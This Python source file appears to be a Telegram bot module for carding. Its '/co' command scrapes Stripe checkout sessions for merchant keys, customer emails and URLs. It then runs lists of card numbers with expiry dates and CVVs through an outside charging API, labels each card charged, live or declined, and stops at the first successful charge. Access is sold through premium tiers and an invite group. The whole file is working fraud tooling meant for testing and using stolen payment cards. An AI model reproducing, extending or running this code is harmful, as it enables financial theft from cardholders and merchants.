import time
import logging
import aiohttp
from aiogram import Router
from aiogram.types import Message
from aiogram.filters import Command
from aiogram.enums import ParseMode

logger = logging.getLogger(__name__)
router = Router()

from config import ALLOWED_GROUP, OWNER_ID, ALLOWED_USERS, PREMIUM_USERS, USER_STATS
from functions.co_functions import parse_stripe_checkout
from functions.hybrid_charge import charge_card_hybrid
from functions.charge_functions import init_checkout, parse_card
import json

API_URL = "https://web-production-2f61.up.railway.app"

def save_stats():
    try:
        import os
        os.makedirs('/root/3D', exist_ok=True)
        with open('/root/3D/user_stats.json', 'w') as f:
            json.dump(USER_STATS, f)
    except Exception as e:
        logger.error(f"Error saving stats: {e}")

def check_access(msg: Message) -> bool:
    if not msg.from_user:
        return False
    user_id = msg.from_user.id
    if user_id == OWNER_ID:
        return True
    if user_id in ALLOWED_USERS:
        return True
    if user_id in PREMIUM_USERS:
        from datetime import datetime
        if datetime.now().timestamp() < PREMIUM_USERS[user_id]:
            return True
    if msg.chat.id == ALLOWED_GROUP:
        return True
    return False

async def charge_card_via_api(url: str, card: str) -> dict:
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(API_URL, params={"url": url, "card": card}, timeout=aiohttp.ClientTimeout(total=30)) as r:
                return await r.json()
    except Exception as e:
        return {"status": "error", "msg": str(e)}

@router.message(Command("co"))
async def co_handler(msg: Message):
    if not check_access(msg):
        await msg.answer(
            "<blockquote><code>𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱 ❌</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗝𝗼𝗶𝗻 𝘁𝗼 𝘂𝘀𝗲 : <code>https://t.me/+Sw15ZeV_gmZiMzc9</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Track user stats
    user_id = msg.from_user.id
    if user_id not in USER_STATS:
        USER_STATS[user_id] = {
            "name": msg.from_user.first_name,
            "username": msg.from_user.username or "None",
            "checkouts": 0,
            "charged": 0
        }
    USER_STATS[user_id]["checkouts"] += 1
    save_stats()
    
    args = msg.text.split(maxsplit=1)
    if len(args) < 2:
        await msg.answer(
            "<blockquote><code>𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 ⚡</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗨𝘀𝗮𝗴𝗲 : <code>/co url</code> - Parse\n"
            "「❃」 𝗨𝘀𝗮𝗴𝗲 : <code>/co url cc|mm|yy|cvv</code> - Charge</blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    parts = args[1].split()
    url = parts[0]
    
    # Parse only mode
    if len(parts) == 1:
        result = await parse_stripe_checkout(url)
        
        if result.get("error"):
            await msg.answer(
                "<blockquote><code>𝗘𝗿𝗿𝗼𝗿 ❌</code></blockquote>\n\n"
                f"<blockquote>「❃」 𝗗𝗲𝘁𝗮𝗶𝗹 : <code>{result.get('error')}</code></blockquote>",
                parse_mode=ParseMode.HTML
            )
            return
        
        price = result.get("price") or "0"
        currency = result.get("currency") or "USD"
        
        response = f"<blockquote><code>𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 ${price} {currency}</code></blockquote>\n\n"
        response += f"<blockquote>「❃」 𝗖𝗦 : <code>{result.get('cs') or 'N/A'}</code>\n"
        response += f"「❃」 𝗣𝗞 : <code>{result.get('pk') or 'N/A'}</code>\n"
        response += f"「❃」 𝗦𝘁𝗮𝘁𝘂𝘀 : SUCCESS ✅</blockquote>\n\n"
        response += f"<blockquote>「❃」 𝗠𝗲𝗿𝗰𝗵𝗮𝗻𝘁 : <code>{result.get('merchant') or 'N/A'}</code>\n"
        response += f"「❃」 𝗣𝗿𝗼𝗱𝘂𝗰𝘁 : <code>{result.get('product') or 'N/A'}</code>\n"
        response += f"「❃」 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : <code>{result.get('country') or 'N/A'}</code>\n"
        response += f"「❃」 𝗠𝗼𝗱𝗲 : <code>{result.get('mode') or 'N/A'}</code></blockquote>\n\n"
        
        if result.get("customer_name") or result.get("customer_email"):
            response += f"<blockquote>「❃」 𝗖𝘂𝘀𝘁𝗼𝗺𝗲𝗿 : <code>{result.get('customer_name') or 'N/A'}</code>\n"
            response += f"「❃」 𝗘𝗺𝗮𝗶𝗹 : <code>{result.get('customer_email') or 'N/A'}</code></blockquote>\n\n"
        
        if result.get("support_email") or result.get("support_phone"):
            response += f"<blockquote>「❃」 𝗦𝘂𝗽𝗽𝗼𝗿𝘁 : <code>{result.get('support_email') or 'N/A'}</code>\n"
            response += f"「❃」 𝗣𝗵𝗼𝗻𝗲 : <code>{result.get('support_phone') or 'N/A'}</code></blockquote>\n\n"
        
        if result.get("cards_accepted"):
            response += f"<blockquote>「❃」 𝗖𝗮𝗿𝗱𝘀 : <code>{result.get('cards_accepted')}</code></blockquote>\n\n"
        
        if result.get("success_url") or result.get("cancel_url"):
            response += f"<blockquote>「❃」 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 : <code>{result.get('success_url') or 'N/A'}</code>\n"
            response += f"「❃」 𝗖𝗮𝗻𝗰𝗲𝗹 : <code>{result.get('cancel_url') or 'N/A'}</code></blockquote>"
        
        await msg.answer(response, parse_mode=ParseMode.HTML)
        return
    
    # Mass charge mode - extract cards from message
    cards = []
    lines = args[1].split('\n')
    for line in lines[1:]:  # Skip first line (URL)
        line = line.strip()
        if '|' in line and len(line.split('|')) == 4:
            cards.append(line)
    
    if not cards:
        await msg.answer(
            "<blockquote><code>𝗘𝗿𝗿𝗼𝗿 ❌</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗗𝗲𝘁𝗮𝗶𝗹 : <code>No cards found</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    processing_msg = await msg.answer(
        f"<blockquote><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 {len(cards)} 𝗖𝗮𝗿𝗱𝘀 ⏳</code></blockquote>",
        parse_mode=ParseMode.HTML
    )
    
    results = []
    charged_card = None
    last_update = time.perf_counter()
    start_time = time.perf_counter()
    
    for i, card in enumerate(cards, 1):
        result = await charge_card_via_api(url, card)
        elapsed = round(time.perf_counter() - start_time, 2)
        
        status = result.get("status", "error")
        msg_text = result.get("msg", "Unknown error")
        
        results.append({"card": card, "status": status, "msg": msg_text, "time": elapsed})
        
        # Calculate stats
        charged = sum(1 for r in results if r['status'] == 'charge')
        live = sum(1 for r in results if r['status'] == 'live')
        declined = sum(1 for r in results if r['status'] == 'dead')
        errors = sum(1 for r in results if r['status'] == 'error')
        
        # Update with current card and stats
        try:
            await processing_msg.edit_text(
                f"<blockquote><code>「 𝗖𝗵𝗮𝗿𝗴𝗶𝗻𝗴 」</code></blockquote>\n\n"
                f"<blockquote>「❃」 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀 : <code>{i}/{len(cards)}</code></blockquote>\n\n"
                f"<blockquote>「❃」 𝗖𝗮𝗿𝗱 : <code>{card}</code>\n"
                f"「❃」 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : <code>{msg_text}</code></blockquote>\n\n"
                f"<blockquote>「❃」 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 : <code>{charged} ✅</code>\n"
                f"「❃」 𝗟𝗶𝘃𝗲 : <code>{live} ✅</code>\n"
                f"「❃」 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 : <code>{declined} ❌</code>\n"
                f"「❃」 𝗘𝗿𝗿𝗼𝗿𝘀 : <code>{errors} ⚠️</code></blockquote>",
                parse_mode=ParseMode.HTML
            )
        except:
            pass
        
        # Stop if charged
        if status == "charge":
            charged_card = results[-1]
            break
    
    total_time = round(time.perf_counter() - start_time, 2)
    
    # Build final response
    if len(cards) == 1:
        # Single card response
        r = results[0]
        merchant = result.get("merchant", "N/A")
        price = result.get("price", "N/A")
        product = result.get("product", "N/A")
        
        if r['status'] == 'charge':
            status_emoji = "✅"
            status_text = "CHARGED"
        elif r['status'] == 'live':
            status_emoji = "✅"
            status_text = "LIVE"
        elif r['status'] == 'dead':
            status_emoji = "❌"
            status_text = "DECLINED"
        else:
            status_emoji = "⚠️"
            status_text = "ERROR"
        
        response = f"<blockquote><code>「 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 {price} 」</code></blockquote>\n\n"
        response += f"<blockquote>「❃」 𝗖𝗮𝗿𝗱 : <code>{r['card']}</code>\n"
        response += f"「❃」 𝗦𝘁𝗮𝘁𝘂𝘀 : <code>{status_text} {status_emoji}</code>\n"
        response += f"「❃」 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : <code>{r['msg']}</code></blockquote>\n\n"
        response += f"<blockquote>「❃」 𝗠𝗲𝗿𝗰𝗵𝗮𝗻𝘁 : <code>{merchant}</code>\n"
        response += f"「❃」 𝗣𝗿𝗼𝗱𝘂𝗰𝘁 : <code>{product}</code></blockquote>\n\n"
        response += f"<blockquote>「❃」 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : <code>/co</code>\n"
        response += f"「❃」 𝗧𝗶𝗺𝗲 : <code>{total_time}s</code></blockquote>"
    elif charged_card:
        USER_STATS[user_id]["charged"] += 1
        save_stats()
        response = f"<blockquote><code>「 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ✅ 」</code></blockquote>\n\n"
        response += f"<blockquote>「❃」 𝗖𝗮𝗿𝗱 : <code>{charged_card['card']}</code>\n"
        response += f"「❃」 𝗦𝘁𝗮𝘁𝘂𝘀 : <code>CHARGED ✅</code>\n"
        response += f"「❃」 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : <code>{charged_card['msg']}</code></blockquote>\n\n"
        if len(results) > 1:
            response += f"<blockquote>「❃」 𝗧𝗿𝗶𝗲𝗱 : <code>{len(results)}/{len(cards)} cards</code></blockquote>\n\n"
        response += f"<blockquote>「❃」 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : <code>/co</code>\n"
        response += f"「❃」 𝗧𝗶𝗺𝗲 : <code>{total_time}s</code></blockquote>"
    else:
        charged = sum(1 for r in results if r['status'] == 'charge')
        live = sum(1 for r in results if r['status'] == 'live')
        declined = sum(1 for r in results if r['status'] == 'dead')
        errors = sum(1 for r in results if r['status'] == 'error')
        
        response = f"<blockquote><code>「 𝗠𝗮𝘀𝘀 𝗖𝗵𝗮𝗿𝗴𝗲 𝗥𝗲𝘀𝘂𝗹𝘁𝘀 」</code></blockquote>\n\n"
        response += f"<blockquote>「❃」 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 : <code>{charged} ✅</code>\n"
        response += f"「❃」 𝗟𝗶𝘃𝗲 : <code>{live} ✅</code>\n"
        response += f"「❃」 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 : <code>{declined} ❌</code>\n"
        response += f"「❃」 𝗘𝗿𝗿𝗼𝗿𝘀 : <code>{errors} ⚠️</code></blockquote>\n\n"
        response += f"<blockquote>「❃」 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : <code>/co</code>\n"
        response += f"「❃」 𝗧𝗶𝗺𝗲 : <code>{total_time}s</code></blockquote>"
    
    await processing_msg.edit_text(response, parse_mode=ParseMode.HTML)
